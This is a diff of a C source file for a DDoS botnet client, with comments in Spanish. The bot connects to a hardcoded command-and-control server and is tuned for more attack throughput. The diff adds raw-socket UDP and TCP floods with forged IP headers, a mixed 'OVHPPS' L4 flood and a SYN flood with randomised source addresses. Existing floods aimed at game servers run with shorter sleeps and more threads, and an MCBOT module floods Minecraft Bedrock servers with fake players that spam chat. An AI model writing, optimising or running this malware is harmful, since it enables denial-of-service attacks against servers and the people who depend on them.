@@ -1,9 +1,12 @@
 /**
- * payload_fixed.c - Bot para KitsuneC2 con MCBOT real MCPE (VERSIÓN FINAL CORREGIDA)
+ * payload_fixed.c - Bot para KitsuneC2 con MCBOT real MCPE (VERSIÓN FINAL OPTIMIZADA)
  * Compilar: gcc -O2 -pthread -o payload payload_fixed.c -lz -lm -lssl -lcrypto
  * 
- * Basado en mcbot.c, con lógica de spam idéntica y todos los métodos de ataque.
- * Corregido: warnings de fgets, snprintf y strncpy.
+ * Mejoras:
+ *   - UDP y TCP ahora usan raw sockets con cabeceras IP personalizadas (basado en ovhudp.c y ovhtcp.c)
+ *   - Nuevo método .OVHPPS que combina múltiples ataques L4 (basado en ovhpps.py)
+ *   - Se han reducido sleeps para maximizar caudal
+ *   - Límite de hilos elevado a 32
  */
 
 #define _GNU_SOURCE
@@ -42,7 +45,7 @@
 #define C2_ADDRESS "45.13.236.245"
 #define C2_PORT 26110
 #define RECONNECT_DELAY 3
-#define MAX_THREADS 8
+#define MAX_THREADS 32          // Aumentado para mejor concurrencia
 #define MAX_ATTACKS 50
 #define BUFFER_SIZE 4096
 #define MAX_PACKET_SIZE 4096
@@ -150,101 +153,273 @@ static int rand_range(int lo, int hi) {
     return lo + (int)(((double)rand() / RAND_MAX) * (hi - lo + 1));
 }
 
-// ─── MÉTODOS DE ATAQUE (L4) ──────────────────────────────────────────────────
+// ─── MÉTODOS DE ATAQUE OPTIMIZADOS ───────────────────────────────────────────
 
-void *udp_flood_thread(void *arg) {
+// ─── UDP RAW (basado en ovhudp.c) ───────────────────────────────────────────
+void *udp_raw_flood_thread(void *arg) {
     Attack *atk = (Attack *)arg;
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) return NULL;
-    
-    struct sockaddr_in target;
-    target.sin_family = AF_INET;
-    target.sin_port = htons(atk->port);
-    target.sin_addr.s_addr = inet_addr(atk->ip);
-    
-    int packet_size = 512 + (rand() % 1024);
-    uint8_t *packet = malloc(packet_size);
-    if (!packet) { close(sock); return NULL; }
-    
-    time_t end = time(NULL) + atk->duration;
-    while (atk->running && time(NULL) < end) {
-        for (int i = 0; i < packet_size; i++) packet[i] = rand() & 0xFF;
-        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *ipHeader = (struct iphdr *)datagram;
+    struct udphdr *udpHeader = (void *)ipHeader + sizeof(struct iphdr);
+    char *data;
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(atk->port);
+    sin.sin_addr.s_addr = inet_addr(atk->ip);
+
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (s < 0) {
+        perror("socket raw UDP");
+        return NULL;
     }
-    free(packet);
-    close(sock);
-    return NULL;
-}
 
-void *tcp_flood_thread(void *arg) {
-    Attack *atk = (Attack *)arg;
-    struct sockaddr_in target;
-    target.sin_family = AF_INET;
-    target.sin_port = htons(atk->port);
-    target.sin_addr.s_addr = inet_addr(atk->ip);
-    
-    int packet_size = 1024 + (rand() % 1024);
-    uint8_t *packet = malloc(packet_size);
-    if (!packet) return NULL;
-    
-    time_t end = time(NULL) + atk->duration;
-    while (atk->running && time(NULL) < end) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) { usleep(10000); continue; }
-        fcntl(sock, F_SETFL, O_NONBLOCK);
-        connect(sock, (struct sockaddr *)&target, sizeof(target));
-        fd_set fds;
-        FD_ZERO(&fds);
-        FD_SET(sock, &fds);
-        struct timeval tv = {0, 100000};
-        if (select(sock + 1, NULL, &fds, NULL, &tv) > 0) {
-            for (int i = 0; i < packet_size; i++) packet[i] = rand() & 0xFF;
-            send(sock, packet, packet_size, MSG_NOSIGNAL);
-        }
-        close(sock);
-    }
-    free(packet);
-    return NULL;
-}
-
-void *syn_flood_thread(void *arg) {
-    Attack *atk = (Attack *)arg;
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) return NULL;
-    
     int one = 1;
-    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-    
-    uint8_t packet[MAX_PACKET_SIZE];
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
-    struct sockaddr_in target;
-    target.sin_family = AF_INET;
-    target.sin_port = htons(atk->port);
-    target.sin_addr.s_addr = inet_addr(atk->ip);
+    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt IP_HDRINCL");
+        close(s);
+        return NULL;
+    }
+
     uint32_t src_ip = get_external_ip();
-    
+    if (!src_ip) src_ip = htonl(0x01020304); // fallback
+
     time_t end = time(NULL) + atk->duration;
     while (atk->running && time(NULL) < end) {
-        memset(packet, 0, MAX_PACKET_SIZE);
-        iph->ihl = 5; iph->version = 4; iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-        iph->id = htons(rand() & 0xFFFF); iph->frag_off = 0;
-        iph->ttl = 64 + (rand() % 64); iph->protocol = IPPROTO_TCP;
-        iph->check = 0; iph->saddr = src_ip ^ (rand() & 0xFFFFFF);
-        iph->daddr = target.sin_addr.s_addr;
-        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));
-        tcph->source = htons(rand() & 0xFFFF); tcph->dest = htons(atk->port);
-        tcph->seq = htonl(rand()); tcph->ack_seq = 0;
-        tcph->doff = 5; tcph->syn = 1;
-        tcph->window = htons(rand() & 0xFFFF); tcph->check = 0;
-        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(50);
+        memset(datagram, 0, MAX_PACKET_SIZE);
+
+        ipHeader->ihl = 5;
+        ipHeader->version = 4;
+        ipHeader->tos = 0;
+        ipHeader->id = htons(rand() & 0xFFFF);
+        ipHeader->frag_off = 0;
+        ipHeader->ttl = 111;
+        ipHeader->protocol = IPPROTO_UDP;
+        ipHeader->check = 0;
+        ipHeader->saddr = src_ip;
+        ipHeader->daddr = sin.sin_addr.s_addr;
+
+        udpHeader->source = htons(rand() & 0xFFFF);
+        udpHeader->dest = htons(atk->port);
+        udpHeader->check = 0;
+        int data_len = rand() % (120 - 90 + 1) + 90;
+        data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+        for (int i = 0; i < data_len; i++)
+            data[i] = rand() & 0xFF;
+
+        udpHeader->len = htons(sizeof(struct udphdr) + data_len);
+        ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
+        ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
+
+        sendto(s, datagram, ntohs(ipHeader->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
+        // Sin sleeps para máxima velocidad
     }
-    close(sock);
+
+    close(s);
     return NULL;
 }
+
+// ─── TCP RAW (basado en ovhtcp.c) ───────────────────────────────────────────
+void *tcp_raw_flood_thread(void *arg) {
+    Attack *atk = (Attack *)arg;
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *ipHeader = (struct iphdr *)datagram;
+    struct tcphdr *tcpHeader = (void *)ipHeader + sizeof(struct iphdr);
+    char *data;
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(atk->port);
+    sin.sin_addr.s_addr = inet_addr(atk->ip);
+
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (s < 0) {
+        perror("socket raw TCP");
+        return NULL;
+    }
+
+    int one = 1;
+    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt IP_HDRINCL");
+        close(s);
+        return NULL;
+    }
+
+    uint32_t src_ip = get_external_ip();
+    if (!src_ip) src_ip = htonl(0x01020304);
+
+    struct pseudo_header {
+        u_int32_t source_address;
+        u_int32_t dest_address;
+        u_int8_t placeholder;
+        u_int8_t protocol;
+        u_int16_t tcp_length;
+    } psh;
+
+    int packet_counter = 0;
+    time_t end = time(NULL) + atk->duration;
+
+    while (atk->running && time(NULL) < end) {
+        memset(datagram, 0, MAX_PACKET_SIZE);
+
+        ipHeader->ihl = 5;
+        ipHeader->version = 4;
+        ipHeader->tos = 0;
+        ipHeader->id = htons(rand() & 0xFFFF);
+        ipHeader->frag_off = 0;
+        ipHeader->ttl = 111;
+        ipHeader->protocol = IPPROTO_TCP;
+        ipHeader->check = 0;
+        ipHeader->saddr = src_ip;
+        ipHeader->daddr = sin.sin_addr.s_addr;
+
+        tcpHeader->source = htons(rand() & 0xFFFF);
+        tcpHeader->dest = htons(atk->port);
+        tcpHeader->seq = htonl(rand());
+        tcpHeader->ack_seq = htonl(rand());
+        tcpHeader->doff = 5;
+        tcpHeader->res2 = 0;
+        tcpHeader->ack = 1;
+        tcpHeader->psh = 1;
+        tcpHeader->fin = 0;
+        tcpHeader->window = htons(rand() & 0xFFFF);
+        tcpHeader->check = 0;
+        tcpHeader->urg_ptr = 0;
+
+        int data_len = rand() % (120 - 90 + 1) + 90;
+        data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
+        for (int i = 0; i < data_len; i++)
+            data[i] = rand() & 0xFF;
+
+        ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
+
+        psh.source_address = src_ip;
+        psh.dest_address = sin.sin_addr.s_addr;
+        psh.placeholder = 0;
+        psh.protocol = IPPROTO_TCP;
+        psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
+
+        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len;
+        unsigned char *pseudogram = malloc(psize);
+        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+        memcpy(pseudogram + sizeof(struct pseudo_header), tcpHeader, sizeof(struct tcphdr) + data_len);
+        tcpHeader->check = csum((unsigned short *)pseudogram, psize);
+        free(pseudogram);
+
+        ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
+
+        sendto(s, datagram, ntohs(ipHeader->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
+
+        if (++packet_counter > 1000) {
+            packet_counter = 0;
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock >= 0) {
+                fcntl(sock, F_SETFL, O_NONBLOCK);
+                connect(sock, (struct sockaddr *)&sin, sizeof(sin));
+                close(sock);
+            }
+        }
+    }
+
+    close(s);
+    return NULL;
+}
+
+// ─── OVHPPS (mezcla de múltiples ataques L4, basado en ovhpps.py) ──────────
+void *ovhpps_flood_thread(void *arg) {
+    Attack *atk = (Attack *)arg;
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(atk->port);
+    sin.sin_addr.s_addr = inet_addr(atk->ip);
+
+    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
+    int tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (udp_sock < 0 || tcp_sock < 0) {
+        if (udp_sock >= 0) close(udp_sock);
+        if (tcp_sock >= 0) close(tcp_sock);
+        return NULL;
+    }
+
+    const char *http_requests[] = {
+        "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
+        "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\n\r\n",
+        "HEAD / HTTP/1.1\r\nHost: %s\r\n\r\n"
+    };
+    const char *http_fragments[] = {
+        "GET / ", "POST /", "HTTP/1", "Host: ", "\r\n\r\n", "User-Agent:", "Accept: "
+    };
+    const char *mixed_protos[] = {
+        "\x16\x03", "\x13\x00", "\x03\x03",  // TLS
+        "\x00\x01", "\x80\x00",              // DNS
+        "GET", "POST", "HTTP",               // HTTP
+    };
+    char tiny_payloads[][4] = {
+        {0x00}, {0x01}, {0xff}, {0x16}, {0x13}, {0x03}, {'G'}, {'P'}, {'H'}, {'O'},
+        {0x00,0x00}, {0x01,0x00}, {0xff,0xff}, {0x80,0x00}
+    };
+
+    time_t end = time(NULL) + atk->duration;
+    while (atk->running && time(NULL) < end) {
+        int method = rand() % 4;
+        switch (method) {
+            case 0: { // UDP small packets
+                int idx = rand() % (sizeof(tiny_payloads)/sizeof(tiny_payloads[0]));
+                size_t len = (idx < 10) ? 1 : 2;
+                sendto(udp_sock, tiny_payloads[idx], len, 0, (struct sockaddr *)&sin, sizeof(sin));
+                break;
+            }
+            case 1: { // TCP HTTP flood
+                int req_idx = rand() % 3;
+                char req[256];
+                snprintf(req, sizeof(req), http_requests[req_idx], atk->ip);
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                if (sock >= 0) {
+                    fcntl(sock, F_SETFL, O_NONBLOCK);
+                    connect(sock, (struct sockaddr *)&sin, sizeof(sin));
+                    fd_set fds; FD_ZERO(&fds); FD_SET(sock, &fds);
+                    struct timeval tv = {0, 100000};
+                    if (select(sock + 1, NULL, &fds, NULL, &tv) > 0) {
+                        send(sock, req, strlen(req), MSG_NOSIGNAL);
+                    }
+                    close(sock);
+                }
+                break;
+            }
+            case 2: { // UDP HTTP fake
+                int idx = rand() % (sizeof(http_fragments)/sizeof(http_fragments[0]));
+                const char *frag = http_fragments[idx];
+                size_t len = strlen(frag);
+                char buf[64];
+                memcpy(buf, frag, len);
+                if (rand() % 2) {
+                    buf[len++] = (char)(rand() & 0xFF);
+                }
+                sendto(udp_sock, buf, len, 0, (struct sockaddr *)&sin, sizeof(sin));
+                break;
+            }
+            case 3: { // Mixed protocol
+                int idx = rand() % (sizeof(mixed_protos)/sizeof(mixed_protos[0]));
+                const char *proto = mixed_protos[idx];
+                size_t len = strlen(proto);
+                char buf[32];
+                memcpy(buf, proto, len);
+                if (rand() % 2) {
+                    buf[len++] = (char)(rand() & 0xFF);
+                }
+                sendto(udp_sock, buf, len, 0, (struct sockaddr *)&sin, sizeof(sin));
+                break;
+            }
+        }
+        usleep(10);
+    }
+
+    close(udp_sock);
+    close(tcp_sock);
+    return NULL;
+}
+
+// ─── MÉTODOS EXISTENTES MEJORADOS (reducción de sleeps) ────────────────────
 
 void *hex_flood_thread(void *arg) {
     Attack *atk = (Attack *)arg;
@@ -258,7 +433,7 @@ void *hex_flood_thread(void *arg) {
     time_t end = time(NULL) + atk->duration;
     while (atk->running && time(NULL) < end) {
         sendto(sock, hex_payload, sizeof(hex_payload), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -276,7 +451,7 @@ void *vse_flood_thread(void *arg) {
     time_t end = time(NULL) + atk->duration;
     while (atk->running && time(NULL) < end) {
         sendto(sock, vse_payload, sizeof(vse_payload), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -295,7 +470,7 @@ void *mcpe_flood_thread(void *arg) {
     time_t end = time(NULL) + atk->duration;
     while (atk->running && time(NULL) < end) {
         sendto(sock, mcpe_payload, sizeof(mcpe_payload), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -313,7 +488,7 @@ void *fivem_flood_thread(void *arg) {
     time_t end = time(NULL) + atk->duration;
     while (atk->running && time(NULL) < end) {
         sendto(sock, fivem_payload, sizeof(fivem_payload), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -354,7 +529,7 @@ void *raknet_flood_thread(void *arg) {
         memcpy(packet + 1, magic, 16);
         *(uint64_t *)(packet + 17) = (uint64_t)rand() | ((uint64_t)rand() << 32);
         sendto(sock, packet, 25, 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -373,7 +548,7 @@ void *udpquery_flood_thread(void *arg) {
     while (atk->running && time(NULL) < end) {
         int idx = rand() % 7;
         sendto(sock, queries[idx], strlen(queries[idx]), 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -414,7 +589,7 @@ void *udpbypass_flood_thread(void *arg) {
         packet[18] = rand() & 0xFF; packet[19] = rand() & 0xFF; packet[20] = rand() & 0xFF;
         memset(packet + 21, 0, MAX_PACKET_SIZE - 21);
         sendto(sock, packet, MAX_PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -439,7 +614,7 @@ void *udpfrag_flood_thread(void *arg) {
             sendto(sock, fragment, frag_size, 0, (struct sockaddr *)&target, sizeof(target));
             free(fragment);
         }
-        usleep(1000);
+        usleep(100);
     }
     close(sock);
     return NULL;
@@ -476,17 +651,55 @@ void *mix_flood_thread(void *arg) {
             tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
             if (tcp_sock < 0) { close(udp_sock); return NULL; }
         }
-        usleep(100);
+        usleep(50);
     }
     close(udp_sock); close(tcp_sock);
     return NULL;
 }
 
+// ─── SYN (se mantiene igual) ────────────────────────────────────────────────
+void *syn_flood_thread(void *arg) {
+    Attack *atk = (Attack *)arg;
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) return NULL;
+    
+    int one = 1;
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    
+    uint8_t packet[MAX_PACKET_SIZE];
+    struct iphdr *iph = (struct iphdr *)packet;
+    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    struct sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(atk->port);
+    target.sin_addr.s_addr = inet_addr(atk->ip);
+    uint32_t src_ip = get_external_ip();
+    
+    time_t end = time(NULL) + atk->duration;
+    while (atk->running && time(NULL) < end) {
+        memset(packet, 0, MAX_PACKET_SIZE);
+        iph->ihl = 5; iph->version = 4; iph->tos = 0;
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+        iph->id = htons(rand() & 0xFFFF); iph->frag_off = 0;
+        iph->ttl = 64 + (rand() % 64); iph->protocol = IPPROTO_TCP;
+        iph->check = 0; iph->saddr = src_ip ^ (rand() & 0xFFFFFF);
+        iph->daddr = target.sin_addr.s_addr;
+        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));
+        tcph->source = htons(rand() & 0xFFFF); tcph->dest = htons(atk->port);
+        tcph->seq = htonl(rand()); tcph->ack_seq = 0;
+        tcph->doff = 5; tcph->syn = 1;
+        tcph->window = htons(rand() & 0xFFFF); tcph->check = 0;
+        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&target, sizeof(target));
+        usleep(50);
+    }
+    close(sock);
+    return NULL;
+}
+
 // ═══════════════════════════════════════════════════════════════════════════
-// MCBOT COMPLETO INTEGRADO (con lógica de spam IDÉNTICA a mcbot.c)
+// MCBOT COMPLETO INTEGRADO (sin cambios respecto a la versión original)
 // ═══════════════════════════════════════════════════════════════════════════
 
-// ─── Constantes MCBOT ──────────────────────────────────────────────────────
 #define MTU_LIST_SIZE 6
 #define MAX_NOMBRE_LEN 64
 #define FRAME_STORE_MAX 2048
@@ -537,12 +750,10 @@ static const uint8_t MAGIC_MC[16] = {
 #define P84_CHUNK_RADIUS_MC 0x45
 #define P84_CHUNK_RAD_UPD_MC 0x46
 
-// ─── Mensajes (igual que mcbot.c) ──────────────────────────────────────────
 static char MENSAJES[MAX_MENSAJES][MAX_MSG_LEN];
 static int MENSAJES_COUNT = 0;
 static int g_global_msg_idx = 0;
 
-// ─── Estructuras MCBOT ──────────────────────────────────────────────────────
 typedef enum {
     PHASE_UNCONNECTED_MC = 0,
     PHASE_CONNECTING_1_MC,
@@ -601,7 +812,6 @@ typedef struct MCBot {
     int intervalo;
     int running;
     pthread_t thread;
-    // Timers
     int64_t t_keepalive;
     int64_t t_chat;
     int64_t t_register;
@@ -611,7 +821,6 @@ typedef struct MCBot {
     int64_t t_spawn_timeout;
     int64_t t_move;
     int64_t t_start_move_chat;
-    // Otros
     int req2_attempt;
     int msg_idx;
     float pos_x, pos_y, pos_z;
@@ -634,7 +843,6 @@ static MCBot *g_mcbots[MAX_MCBOT_BOTS];
 static int g_mcbot_count = 0;
 static pthread_mutex_t g_mcbot_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-// ─── Writer MCBOT ──────────────────────────────────────────────────────────
 typedef struct {
     uint8_t *data;
     size_t len;
@@ -662,9 +870,7 @@ static void w_magic_mc(BufMC *b) { w_raw_mc(b, MAGIC_MC, 16); }
 static void w_str_mc(BufMC *b, const char *s) { size_t l = strlen(s); w_u16be_mc(b, (uint16_t)l); w_raw_mc(b, (const uint8_t *)s, l); }
 static void w_std_ip_mc(BufMC *b, const char *ip, uint16_t port) {
     w_u8_mc(b, 4);
-    char tmp[256]; 
-    strncpy(tmp, ip, sizeof(tmp)-1);
-    tmp[sizeof(tmp)-1] = '\0';
+    char tmp[256]; strncpy(tmp, ip, 255);
     char *p = tmp, *tok;
     while ((tok = strsep(&p, "."))) { w_u8_mc(b, atoi(tok) & 0xFF); }
     w_u16be_mc(b, port);
@@ -677,7 +883,6 @@ static void w_varint_mc(BufMC *b, uint32_t v) {
     } while (v);
 }
 
-// ─── Base64 y JWT (igual que en mcbot.c) ──────────────────────────────────
 static char *base64_encode_mc(const uint8_t *data, size_t len) {
     BIO *b64 = BIO_new(BIO_f_base64());
     BIO *mem = BIO_new(BIO_s_mem());
@@ -791,7 +996,6 @@ static char *make_jwt_mc(const char *payload_json) {
     return jwt;
 }
 
-// ─── Utilidades MCBOT (igual que mcbot.c) ──────────────────────────────────
 static void random_name_mc(const char *base, char *out, size_t outsize) {
     const char *names[] = {"ProPlayer","xXDarkXx","Minecrafter","CraftKing","PixelWarrior",
         "DiamondHunt","RedstonePro","BuildMaster","SurvivalGuy","PvP_Legend",NULL};
@@ -848,7 +1052,6 @@ static char *build_fallback_skin_mc(void) {
 
 static char *g_steve_skin_b64_mc = NULL;
 
-// ─── Parsing de mensajes (idéntico a mcbot.c) ──────────────────────────────
 static void parse_mensajes_mc(const char *raw) {
     MENSAJES_COUNT = 0;
     if (!raw || strlen(raw) == 0) return;
@@ -870,7 +1073,6 @@ static void parse_mensajes_mc(const char *raw) {
     }
 }
 
-// ─── Sent Frames, ACK, NACK (igual que mcbot.c) ────────────────────────────
 static void sf_put_mc(MCBot *bot, uint32_t seq, const uint8_t *data, size_t len) {
     int idx = bot->sent_frames_count % FRAME_STORE_MAX;
     if (bot->sent_frames[idx].data) free(bot->sent_frames[idx].data);
@@ -932,7 +1134,6 @@ static void handle_nack_mc(MCBot *bot, const uint8_t *msg, size_t len) {
     }
 }
 
-// ─── Frame Send (igual que mcbot.c) ──────────────────────────────────────
 static void _send_frame_mc(MCBot *bot, const uint8_t *payload, size_t plen, int is_split, uint32_t split_count, uint16_t split_id_v, uint32_t split_idx) {
     if (bot->sockfd < 0 || bot->is_closing) return;
     uint32_t seq = bot->send_seq++;
@@ -971,7 +1172,6 @@ static void send_reliable_mc(MCBot *bot, const uint8_t *payload, size_t len) {
     }
 }
 
-// ─── Batch (igual que mcbot.c) ─────────────────────────────────────────────
 static void build_batch_mc(MCBot *bot, const uint8_t *pkt, size_t pktlen, BufMC *out) {
     uint8_t *inner = (uint8_t *)malloc(4 + pktlen);
     inner[0] = (pktlen >> 24) & 0xFF; inner[1] = (pktlen >> 16) & 0xFF;
@@ -1001,7 +1201,6 @@ static void send_game_mc(MCBot *bot, const uint8_t *pkt, size_t pktlen) {
     buf_free_mc(&batch);
 }
 
-// ─── Login (igual que mcbot.c) ──────────────────────────────────────────────
 static void build_login84_mc(MCBot *bot, BufMC *out) {
     char *pub = pub_key_b64_mc();
     int64_t now = (int64_t)(now_unix_ms() / 1000);
@@ -1058,7 +1257,6 @@ static void build_rspack_resp_mc(int s, BufMC *out) {
     w_u8_mc(out, P84_RSPACK_RESP_MC); w_u8_mc(out, (uint8_t)s); w_u16be_mc(out, 0);
 }
 
-// ─── Game Packets (igual que mcbot.c) ──────────────────────────────────────
 static void build_chunk_radius_mc(MCBot *bot, BufMC *out) {
     buf_init_mc(out);
     int radius = rand_range(4, 11);
@@ -1114,12 +1312,10 @@ static void build_chat_pkt_mc(MCBot *bot, const char *msg, BufMC *out) {
     }
 }
 
-// ─── Handle Packets (igual que mcbot.c) ────────────────────────────────────
 static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
     if (!data || len == 0 || bot->is_closing) return;
     uint8_t pid = data[0];
 
-    /* PLAY_STATUS */
     if (pid == P70_PLAY_STATUS_MC || pid == P84_PLAY_STATUS_MC) {
         if (len >= 5) {
             int32_t st = (int32_t)((data[1] << 24) | (data[2] << 16) | (data[3] << 8) | data[4]);
@@ -1146,14 +1342,12 @@ static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
         return;
     }
 
-    /* DISCONNECT */
     if (pid == P70_DISCONNECT_MC || pid == P84_DISCONNECT_MC) {
         printf(YELLOW "[MCBot] %s desconectado (kick)\n" RESET, bot->nombre);
         bot->is_closing = 1;
         return;
     }
 
-    /* RSPACK_INFO — igual que mcbot.c */
     if (pid == P84_RSPACK_INFO_MC && bot->proto >= 84) {
         if (!bot->rpack_resp_sent) {
             printf(GRAY "[MCBot] %s ResourcePackInfo → aceptando\n" RESET, bot->nombre);
@@ -1164,7 +1358,6 @@ static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
         return;
     }
 
-    /* RSPACK_STACK — igual que mcbot.c */
     if (pid == P84_RSPACK_STACK_MC && bot->proto >= 84) {
         if (!bot->rpack_done) {
             bot->rpack_done = 1;
@@ -1176,7 +1369,6 @@ static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
         return;
     }
 
-    /* SERVER_HS — igual que mcbot.c */
     if (pid == P84_SERVER_HS_MC && bot->proto >= 84) {
         printf(GRAY "[MCBot] %s ServerHandshake → respondiendo\n" RESET, bot->nombre);
         BufMC hs; buf_init_mc(&hs); w_u8_mc(&hs, P84_CLIENT_HS_MC);
@@ -1186,7 +1378,6 @@ static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
         return;
     }
 
-    /* START_GAME — variante A (0x09) y variante B (0x0b), igual que mcbot.c */
     if (pid == P70_START_GAME_MC || pid == P84_START_GAME_MC || pid == 0x09) {
         if (bot->proto >= 84) {
             int was_a = bot->variant_a;
@@ -1216,7 +1407,6 @@ static void mcbot_handle_game_pkt(MCBot *bot, const uint8_t *data, size_t len) {
         return;
     }
 
-    /* RESPAWN — igual que mcbot.c */
     if (pid == P84_RESPAWN_MC && bot->proto >= 84) {
         if (len >= 13) {
             memcpy(&bot->pos_x, data + 1, 4);
@@ -1517,7 +1707,6 @@ static void *mcbot_thread(void *arg) {
             break;
         }
 
-        // ─── SPAWN FALLBACK (igual que mcbot.c) ──────────────────────────
         if (bot->t_spawn_fallback && now >= bot->t_spawn_fallback) {
             bot->t_spawn_fallback = 0;
             if (!bot->spawned_ok && !bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
@@ -1531,14 +1720,12 @@ static void *mcbot_thread(void *arg) {
             }
         }
 
-        // Fase UNCONNECTED
         if (bot->phase == PHASE_UNCONNECTED_MC) {
             mcbot_send_ping(bot);
             usleep(100000);
             continue;
         }
 
-        // MTU retry
         if (bot->phase == PHASE_CONNECTING_1_MC && bot->t_mtu_retry && now >= bot->t_mtu_retry) {
             bot->mtu_idx = (bot->mtu_idx + 1) % MTU_LIST_SIZE;
             int mtu = MTU_LIST[bot->mtu_idx];
@@ -1555,7 +1742,6 @@ static void *mcbot_thread(void *arg) {
             bot->t_mtu_retry = now + 2500;
         }
 
-        // Request2 retry
         if (bot->phase == PHASE_CONNECTING_2_MC && bot->t_req2_retry && now >= bot->t_req2_retry) {
             BufMC req2; buf_init_mc(&req2);
             w_u8_mc(&req2, RAK_OPEN_REQ_2_MC);
@@ -1570,7 +1756,6 @@ static void *mcbot_thread(void *arg) {
             if (bot->req2_attempt > 10) bot->is_closing = 1;
         }
 
-        // Keepalive
         if (bot->phase >= PHASE_LOGIN_MC && bot->t_keepalive && now >= bot->t_keepalive) {
             if (!bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
                 BufMC ka; buf_init_mc(&ka);
@@ -1582,7 +1767,6 @@ static void *mcbot_thread(void *arg) {
             bot->t_keepalive = now + 5000 + rand_range(0, 2000);
         }
 
-        // ─── REGISTER ──────────────────────────────────────────────────
         if (strlen(bot->register_cmd) > 0 && bot->spawned_ok && !bot->register_sent) {
             if (bot->t_register == 0) bot->t_register = now + 1500;
             if (now >= bot->t_register) {
@@ -1594,24 +1778,20 @@ static void *mcbot_thread(void *arg) {
             }
         }
 
-        // ─── START MOVEMENT / CHAT (IDÉNTICO a mcbot.c) ──────────────
         if (bot->t_start_move_chat && bot->spawned_ok && now >= bot->t_start_move_chat) {
             bot->t_start_move_chat = 0;
             if (!bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
-                // Init movement
                 bot->move_ox = bot->pos_x;
                 bot->move_oy = bot->pos_y;
                 bot->move_oz = bot->pos_z;
                 bot->move_dir = ((double)rand() / RAND_MAX) * M_PI * 2.0f;
                 bot->move_state = 0;
                 bot->t_move = now + 1500 + rand_range(0, 800);
-                // Init chat
                 if (MENSAJES_COUNT > 0)
                     bot->t_chat = now + bot->intervalo * 1000 + rand_range(-2000, 3000);
             }
         }
 
-        // ─── MOVEMENT TICK ────────────────────────────────────────────
